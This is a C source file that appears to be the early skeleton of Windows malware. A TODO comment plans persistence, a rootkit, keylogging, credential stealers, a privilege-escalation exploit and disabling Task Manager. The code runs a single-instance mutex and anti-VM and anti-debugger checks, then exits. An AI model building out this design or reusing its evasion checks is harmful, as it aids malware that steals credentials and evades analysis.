/*
	TODO:
		- complete anti-vm/anti-sandbox
		- persistence
		- set critical process
			- check admin rights
			- http://www.rohitab.com/discuss/topic/40275-set-a-process-as-critical-process-using-ntsetinformationprocess-function/
		- disable taskmgr/cmd
			- check admin rights
		- win 7 privesc exploit
		- screen melter
		- download/execute
		- proxy
		- ring3 rootkit
			- API hooking
				- explorer.exe FindFirst/NextFileW
		- keylogging
		- credential stealers
*/

#include <Windows.h>
#include <intrin.h>

#include "main.h"
#include "anti.h"
#include "helper.h"

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	CreateMutex(NULL, TRUE, NAME);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);

#ifdef ANTI_VIRTUALIZATION
	if (CheckForVirtualization() == TRUE)
		ExitProcess(0);
#endif

#ifdef ANTI_DEBUGGING
	if (CheckForDebuggers() == TRUE)
		ExitProcess(0);
#endif

	// get version info

	Debug("Hello");

	return 0;
}